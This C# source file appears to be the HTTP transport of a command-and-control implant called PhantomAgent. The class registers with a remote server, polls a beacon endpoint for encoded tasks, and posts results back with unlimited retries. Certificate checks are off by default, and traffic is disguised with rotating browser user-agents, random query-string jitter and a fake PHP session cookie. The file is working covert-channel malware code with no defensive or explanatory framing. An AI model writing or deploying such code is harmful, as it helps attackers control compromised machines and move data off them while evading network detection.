using System.Net;
using System.Text;
using System.Text.Json;

namespace PhantomAgent.Transport;

public class HttpTransport : ITransport
{
    private readonly string _baseUrl;
    private readonly int _retryCount;
    private readonly double _retryDelay;
    private readonly HttpClient _client;
    private string? _sessionId;

    private static readonly string[] UserAgents =
    {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    };

    private static readonly string[] JitterParamKeys = { "t", "v", "check", "lang", "ref" };
    private static readonly string[] LangValues = { "en", "en-US", "en-GB" };

    public bool Connected { get; private set; }

    public HttpTransport(string baseUrl, bool skipCertValidation = true,
                         int retryCount = -1, double retryDelay = 10.0, int timeout = 30)
    {
        _baseUrl = baseUrl.TrimEnd('/');
        _retryCount = retryCount;
        _retryDelay = retryDelay;

        var handler = new HttpClientHandler();
        if (skipCertValidation)
            handler.ServerCertificateCustomValidationCallback = (_, _, _, _) => true;

        _client = new HttpClient(handler) { Timeout = TimeSpan.FromSeconds(timeout) };
    }

    public bool Connect()
    {
        _sessionId = Guid.NewGuid().ToString("N")[..16];
        int attempts = 0;
        while (_retryCount == -1 || attempts < _retryCount)
        {
            try
            {
                string url = JitterUrl("/api/v1/register");
                var payload = JsonSerializer.Serialize(new
                {
                    data = Convert.ToBase64String(Encoding.UTF8.GetBytes("register")),
                    id = _sessionId
                });
                var req = BuildRequest(HttpMethod.Post, url, payload);
                var resp = _client.Send(req);
                if (resp.IsSuccessStatusCode)
                {
                    Connected = true;
                    return true;
                }
            }
            catch { }

            attempts++;
            if (_retryCount != -1 && attempts >= _retryCount)
                return false;
            Thread.Sleep((int)(_retryDelay * 1000));
        }
        return false;
    }

    public bool Send(byte[] data)
    {
        if (!Connected || _sessionId == null) return false;
        int attempts = 0;
        while (_retryCount == -1 || attempts < _retryCount)
        {
            try
            {
                string url = JitterUrl("/api/v1/response");
                var payload = JsonSerializer.Serialize(new
                {
                    data = Convert.ToBase64String(data),
                    id = _sessionId
                });
                var req = BuildRequest(HttpMethod.Post, url, payload);
                var resp = _client.Send(req);
                if (resp.IsSuccessStatusCode)
                    return true;
            }
            catch { }

            attempts++;
            if (_retryCount != -1 && attempts >= _retryCount)
                break;
            Thread.Sleep((int)(_retryDelay * 1000));
        }
        Connected = false;
        return false;
    }

    public byte[]? Recv()
    {
        if (!Connected || _sessionId == null) return null;
        try
        {
            string url = JitterUrl($"/api/v1/beacon/{_sessionId}");
            var req = BuildRequest(HttpMethod.Get, url, null);
            var resp = _client.Send(req);
            if (!resp.IsSuccessStatusCode) return null;

            string body = resp.Content.ReadAsStringAsync().GetAwaiter().GetResult();
            using var doc = JsonDocument.Parse(body);
            if (doc.RootElement.TryGetProperty("data", out var dataProp))
            {
                string? encoded = dataProp.GetString();
                if (string.IsNullOrEmpty(encoded)) return null;
                return Convert.FromBase64String(encoded);
            }
        }
        catch { }
        return null;
    }

    public void Disconnect()
    {
        if (_sessionId != null)
        {
            try
            {
                string url = JitterUrl("/api/v1/register");
                var req = BuildRequest(HttpMethod.Delete, url, null);
                _client.Send(req);
            }
            catch { }
        }
        Connected = false;
        _sessionId = null;
    }

    private HttpRequestMessage BuildRequest(HttpMethod method, string url, string? jsonBody)
    {
        var req = new HttpRequestMessage(method, url);
        var rng = Random.Shared;
        req.Headers.Add("User-Agent", UserAgents[rng.Next(UserAgents.Length)]);
        req.Headers.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,application/json,*/*;q=0.8");
        req.Headers.Add("Accept-Language", "en-US,en;q=0.9");
        req.Headers.Add("Connection", "keep-alive");
        req.Headers.Add("Referer", _baseUrl + "/");
        if (_sessionId != null)
            req.Headers.Add("Cookie", $"PHPSESSID={_sessionId}");
        if (jsonBody != null)
            req.Content = new StringContent(jsonBody, Encoding.UTF8, "application/json");
        return req;
    }

    private string JitterUrl(string path)
    {
        var rng = Random.Shared;
        var sb = new StringBuilder(_baseUrl);
        sb.Append(path);
        sb.Append('?');

        // Append 1-3 random query params for URL jitter
        int paramCount = rng.Next(1, 4);
        var usedKeys = new HashSet<int>();
        for (int i = 0; i < paramCount; i++)
        {
            int idx;
            do { idx = rng.Next(JitterParamKeys.Length); } while (usedKeys.Contains(idx));
            usedKeys.Add(idx);

            if (i > 0) sb.Append('&');
            string key = JitterParamKeys[idx];
            sb.Append(key);
            sb.Append('=');
            sb.Append(key switch
            {
                "t" => DateTimeOffset.UtcNow.ToUnixTimeSeconds().ToString(),
                "v" => rng.Next(1, 21).ToString(),
                "check" => rng.Next(2) == 0 ? "true" : "false",
                "lang" => LangValues[rng.Next(LangValues.Length)],
                "ref" => Guid.NewGuid().ToString("N")[..8],
                _ => ""
            });
        }
        return sb.ToString();
    }
}
